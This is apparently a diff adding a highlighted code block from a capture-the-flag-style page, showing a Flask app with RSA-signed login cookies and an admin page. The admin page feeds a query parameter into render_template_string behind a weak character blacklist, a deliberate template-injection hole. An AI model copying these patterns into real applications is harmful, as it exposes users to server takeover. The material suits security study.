+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><div class="code-block highlight line-wrapping line-nos-hidden" data-mode="classic" data-copyable="true"><div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="action-btn line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers" data-ct-tooltip><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="action-btn line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap" data-ct-tooltip><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="action-btn copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard" data-copied-text="Copied" data-ct-tooltip><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="100" data-line-digit="3" style="--fi-max-shown-lines:100;--fi-line-digit:3;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">binascii</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">dataclasses</span> <span class="kn">import</span> <span class="n">dataclass</span><span class="p">,</span> <span class="n">asdict</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">Tuple</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">KEY</span><span class="p">,</span> <span class="n">ADMIN_PASSWORD</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Signature</span> <span class="kn">import</span> <span class="n">PKCS1_v1_5</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Hash</span> <span class="kn">import</span> <span class="n">SHA256</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Flask</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">render_template</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">render_template_string</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">request</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">redirect</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url_for</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flash</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">abort</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">KEY</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="s2">&#34;/etc/ssl/nginx/local.key&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/etc/ssl/nginx/local.key&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">public_key</span> <span class="o">=</span> <span class="n">private_key</span><span class="o">.</span><span class="n">publickey</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@dataclass</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">APPUser</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">name</span><span class="p">:</span> <span class="nb">str</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password_raw</span><span class="p">:</span> <span class="nb">str</span>
+</span></span><span class="line"><span class="cl">    <span class="n">register_time</span><span class="p">:</span> <span class="nb">int</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#  In-memory store for user registration</span>
+</span></span><span class="line"><span class="cl"><span class="n">users</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">APPUser</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;admin&#34;</span><span class="p">:</span> <span class="n">APPUser</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="n">password_raw</span><span class="o">=</span><span class="n">ADMIN_PASSWORD</span><span class="p">,</span> <span class="n">register_time</span><span class="o">=-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">validate_cookie</span><span class="p">(</span><span class="n">cookie_b64</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">valid</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">parse_cookie</span><span class="p">(</span><span class="n">cookie_b64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">valid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_cookie</span><span class="p">(</span><span class="n">cookie_b64</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">bool</span><span class="p">,</span> <span class="nb">str</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">cookie_b64</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cookie</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">cookie_b64</span><span class="p">,</span> <span class="n">validate</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">binascii</span><span class="o">.</span><span class="n">Error</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">msg_str</span><span class="p">,</span> <span class="n">sig_hex</span> <span class="o">=</span> <span class="n">cookie</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;&amp;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span><span class="p">,</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">msg_dict</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">msg_str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg_str_bytes</span> <span class="o">=</span> <span class="n">msg_str</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg_hash</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">msg_str_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sig</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">sig_hex</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PKCS1_v1_5</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span><span class="o">.</span><span class="n">verify</span><span class="p">(</span><span class="n">msg_hash</span><span class="p">,</span> <span class="n">sig</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">valid</span> <span class="o">=</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">(</span><span class="ne">ValueError</span><span class="p">,</span> <span class="ne">TypeError</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">valid</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">valid</span><span class="p">,</span> <span class="n">msg_dict</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;user_name&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">generate_cookie</span><span class="p">(</span><span class="n">user</span><span class="p">:</span> <span class="n">APPUser</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg_dict</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;user_name&#34;</span><span class="p">:</span> <span class="n">user</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="s2">&#34;login_time&#34;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg_str</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">msg_dict</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg_str_bytes</span> <span class="o">=</span> <span class="n">msg_str</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">msg_hash</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">msg_str_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sig</span> <span class="o">=</span> <span class="n">PKCS1_v1_5</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span><span class="o">.</span><span class="n">sign</span><span class="p">(</span><span class="n">msg_hash</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sig_hex</span> <span class="o">=</span> <span class="n">sig</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">packed</span> <span class="o">=</span> <span class="n">msg_str</span> <span class="o">+</span> <span class="s2">&#34;&amp;&#34;</span> <span class="o">+</span> <span class="n">sig_hex</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">packed</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">validate_cookie</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;jwbcookie&#34;</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;home&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/register&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">user_name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user_name</span> <span class="ow">in</span> <span class="n">users</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;Username already exists!&#34;</span><span class="p">,</span> <span class="s2">&#34;danger&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">users</span><span class="p">[</span><span class="n">user_name</span><span class="p">]</span> <span class="o">=</span> <span class="n">APPUser</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="n">name</span><span class="o">=</span><span class="n">user_name</span><span class="p">,</span> <span class="n">password_raw</span><span class="o">=</span><span class="n">password</span><span class="p">,</span> <span class="n">register_time</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;Registration successful! Please login.&#34;</span><span class="p">,</span> <span class="s2">&#34;success&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;register.html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/login&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="s2">&#34;POST&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s2">&#34;POST&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s2">&#34;password&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="n">users</span> <span class="ow">and</span> <span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]</span><span class="o">.</span><span class="n">password_raw</span> <span class="o">==</span> <span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resp</span> <span class="o">=</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;home&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">resp</span><span class="o">.</span><span class="n">set_cookie</span><span class="p">(</span><span class="s2">&#34;jwbcookie&#34;</span><span class="p">,</span> <span class="n">generate_cookie</span><span class="p">(</span><span class="n">users</span><span class="p">[</span><span class="n">username</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">resp</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">flash</span><span class="p">(</span><span class="s2">&#34;Invalid credentials. Please try again.&#34;</span><span class="p">,</span> <span class="s2">&#34;danger&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;login.html&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/home&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">valid</span><span class="p">,</span> <span class="n">current_username</span> <span class="o">=</span> <span class="n">parse_cookie</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;jwbcookie&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">valid</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">current_username</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;logout&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">user_profile</span> <span class="o">=</span> <span class="n">users</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">current_username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_profile</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;logout&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">current_username</span> <span class="o">==</span> <span class="s2">&#34;admin&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">char</span> <span class="ow">in</span> <span class="s2">&#34;&#39;_#&amp;;&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">abort</span><span class="p">(</span><span class="mi">403</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">html_template</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;title&gt;Home&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;link rel=&#34;stylesheet&#34; href=&#34;{{ url_for(&#39;static&#39;, filename=&#39;styles.css&#39;) }}&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;h2 class=&#34;text-center&#34;&gt;Welcome, </span><span class="si">%s</span><span class="s2"> !&lt;/h2&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;div class=&#34;text-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            Your payload: </span><span class="si">%s</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;img src=&#34;{{ url_for(&#39;static&#39;, filename=&#39;interesting.jpeg&#39;) }}&#34; alt=&#34;Embedded Image&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;div class=&#34;text-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;a href=&#34;/logout&#34; class=&#34;btn btn-danger&#34;&gt;Logout&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span> <span class="o">%</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">current_username</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">payload</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">html_template</span> <span class="o">=</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;title&gt;Home&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;link rel=&#34;stylesheet&#34; href=&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;link rel=&#34;stylesheet&#34; href=&#34;{{ url_for(&#39;static&#39;, filename=&#39;styles.css&#39;) }}&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;h2 class=&#34;text-center&#34;&gt;server code (encoded)&lt;/h2&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;div class=&#34;text-center&#34; style=&#34;word-break:break-all;&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        {</span><span class="si">%%</span><span class="s2"> raw </span><span class="si">%%</span><span class="s2">}
+</span></span></span><span class="line"><span class="cl"><span class="s2">            </span><span class="si">%s</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">        {</span><span class="si">%%</span><span class="s2"> endraw </span><span class="si">%%</span><span class="s2">}
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;div class=&#34;text-center&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &lt;a href=&#34;/logout&#34; class=&#34;btn btn-danger&#34;&gt;Logout&lt;/a&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">        &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">%</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">html_template</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/logout&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">resp</span> <span class="o">=</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s2">&#34;login&#34;</span><span class="p">))</span>
